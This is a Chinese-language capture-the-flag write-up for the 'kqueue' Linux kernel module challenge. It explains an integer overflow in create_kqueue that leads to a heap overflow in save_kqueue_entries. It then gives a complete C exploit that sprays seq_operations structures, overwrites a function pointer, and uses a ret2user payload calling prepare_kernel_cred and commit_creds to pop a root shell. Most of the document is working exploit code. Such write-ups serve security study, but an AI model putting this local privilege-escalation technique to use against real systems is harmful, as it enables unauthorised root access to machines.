# kqueue

## 漏洞分析

本题是印度人出的，不得不说写的就是抽象，开局文件系统都起不起来，直接换成了qwb的就可以了，并且.ko文件反编译出来巨难看，还好给了源码，不然寸步难行。

其漏洞发生在此处

```c
static noinline long create_kqueue(request_t request){
    long result = INVALID;
	
    ...
    
    /* Check if multiplication of 2 64 bit integers results in overflow */
    ull space = 0;
    if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space) == true)
        err("[-] Integer overflow");

    /* Size is the size of queue structure + size of entry * request entries */
    ull queue_size = 0;
    if(__builtin_saddll_overflow(sizeof(queue),space,&queue_size) == true)
        err("[-] Integer overflow");

    /* Total size should not exceed a certain limit */
    if(queue_size>sizeof(queue) + 0x10000)
        err("[-] Max kqueue alloc limit reached");

    ...
}
```

__builtin_umulll_overflow 虽然可以检测计算是否发生溢出，但是却忽视了 request.max_entries 可控，加1便可以直接溢出成 0 ，因此 space 被计算成了 0 ，然而 sizeof(queue) 大小为 0x20 ，queue_size 变成了0x20，所以会分配 0x20 大小的堆块，但此时 max_entries 变成了一个很大的数，接下来观察下面的 save 

```c
static noinline long save_kqueue_entries(request_t request){

    ...

    /* Check if number of requested entries exceed the existing entries */
    if(request.max_entries < 1 || request.max_entries > queue->max_entries)
        err("[-] Invalid entry count");

    /* Allocate memory for the kqueue to be saved */
    char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));

    /* Each saved entry can have its own size */
    if(request.data_size > queue->queue_size)
        err("[-] Entry size limit exceed");

    /* Copy main's queue's data */
    if(queue->data && request.data_size)
        validate(memcpy(new_queue,queue->data,request.data_size));
    else
        err("[-] Internal error");
    new_queue += queue->data_size;

    /* Get to the entries of the kqueue */
    queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);

    /* copy all possible kqueue entries */
    uint32_t i=0;
    for(i=1;i<request.max_entries+1;i++){
        if(!kqueue_entry || !kqueue_entry->data)
            break;
        if(kqueue_entry->data && request.data_size)
            validate(memcpy(new_queue,kqueue_entry->data,request.data_size));
        else
            err("[-] Internal error");
        kqueue_entry = kqueue_entry->next;
        new_queue += queue->data_size;
    }

    /* Mark the queue as saved */
    isSaved[request.queue_idx] = true;
    return 0;
}
```

这边首先进行过了一些判断，因为 max_entries 被变成了一个很大的数，因此这些检查是随便过的，随后，会分配一个 queue_size 大小的堆块，之后将原堆块的数据都复制一些进去，而此时的 queue_size 又很小，只有 0x20 大小，所以此时从 queue 复制的 第二份数据就会发生溢出，那么哪里来的第二份数据呢，这就需要弄一下堆风水了，让 queue 下面刚好是别人的 data 域

然而在看头文件的时候发现

```c
static long err(char* msg){
    printk(KERN_ALERT "%s\n",msg);
    return -1;
}
```

特么是个假 error ，没有直接退出而是返回，太抽象了，不过不打算用上这个

## 漏洞利用

查看数据结构可以发现 data 域是0x20字节，因此为保证可以发生溢出，可以先将 cache 里的 0x20 大小的堆块清掉，随后申请的0x20大小的堆块就会连在一起了，随后在申请一个 max_entries 不为0 的堆块，此时他们的 data 域是连在一起的，这个时候再申请一个 错误的结构体（即0x20大小的queue），这个结构体就会刚好在这两个 data 的上面，所以修改此 data 就相当于修改 queue 的next。

因为本题除了 kaslr 啥都没开，所以可以直接访问到用户的数据，可以直接将next改成 用户态malloc 出来的地址。

随后堆喷 seq_operations 结构体，此结构体为 0x20 大小，并且其四个指针之一在 read 的时候会调用到，之后再 save 那个错误的堆块，还是会申请 0x20 大小的堆块，并且必会在 seq_operations 结构体的上方，因此就会将某一 seq_operations 结构体的指针给覆盖，覆盖成用户态的函数即可。

最后就是喜闻乐见的 ret2user 了

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>

size_t vmlinux_base = 0xffffffff81000000;
size_t commit_creds = 0x8c140;
size_t prepare_kernel_cred = 0x8c580;
size_t user_cs, user_ss, user_rflags, user_sp , user_rip;
int fd = 0;

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE

#define INVALID      -1
#define NOT_EXISTS   -3
#define MAX_QUEUES    5
#define MAX_DATA_SIZE 0x20

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;

typedef struct queue_entry{
    uint16_t idx;
    char *data;
    char *next;
}queue_entry;

void info(char *s , size_t address ){
    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m\033[35m\033[1m%#lx \033[0m\n", s, address);
    else printf("\033[34m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void shell(){
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!",0);
    execl("/bin/sh","sh",NULL);
}

void save_status(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (size_t)shell;
    info("status saved!",0);
}

void root(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov rsi, rsp;"
        "mov rsi, [rsi + 8];"
        "sub rsi, 0x201179;"
        "mov r12 , rsi;"
        "mov r13 , rsi;"
        "add r12 , prepare_kernel_cred ;"
        "add r13 , commit_creds ;"

        "mov rdi, 0 ;"
        "call r12 ;"
        "mov rdi, rax ;"
        "call r13 ;"

        "swapgs;"
        "mov r14, user_ss;"
        "push r14;"
        "mov r14, user_sp;"
        "push r14;"
        "mov r14, user_rflags;"
        "push r14;"
        "mov r14, user_cs;"
        "push r14;"
        "mov r14, user_rip;"
        "push r14;"
        "iretq;"
        ".att_syntax;"
    );
}

void create(uint32_t max_entries , uint16_t data_size){
    request_t request;
    request.max_entries = max_entries;
    request.data_size = data_size;

    ioctl(fd , CREATE_KQUEUE , &request);
}

void delete( uint16_t queue_idx){
    request_t request;
    request.queue_idx = queue_idx;

    ioctl(fd , DELETE_KQUEUE , &request);
}

void save( uint16_t queue_idx , uint32_t max_entries ,uint16_t data_size ){
    request_t request;
    request.max_entries = max_entries;
    request.queue_idx = queue_idx;
    request.data_size = data_size;

    ioctl(fd , SAVE , &request);
}

void edit( uint16_t queue_idx , uint16_t entry_idx , char *data){
    request_t request;
    request.queue_idx = queue_idx;
    request.entry_idx = entry_idx;
    request.data = data;

    ioctl(fd , EDIT_KQUEUE , &request);
}

int main(){
    
    size_t buffer[0x100] = {0};
    int seq_fd[0x100] = {0};

    save_status();

    queue_entry *entry = (queue_entry *) malloc(0x20);
    entry->idx = 1;
    entry->data = (char *)malloc(0x20);

    buffer[0] = (size_t )root;
    buffer[1] = (size_t )root;
    buffer[2] = (size_t )root;
    buffer[3] = (size_t )root;

    memcpy(entry->data , buffer , 0x20);

    fd = open("/dev/kqueue" , O_RDWR);

    create(0x800 , MAX_DATA_SIZE);
    create(1 , MAX_DATA_SIZE);
    create(0xffffffff , MAX_DATA_SIZE);

    edit(1 , 1 , (char *)entry);

    for (int i =0;i<0x100;i++){
        seq_fd[i] =  open("/proc/self/stat", O_RDONLY);
    }

    // getchar();
    save(2 , 2 , 0x20) ; 

    info("(size_t )root" , (size_t )root);

    for (int i =0;i<0x100;i++){
        read(seq_fd[i] , buffer , 0x10);
    }
}


```

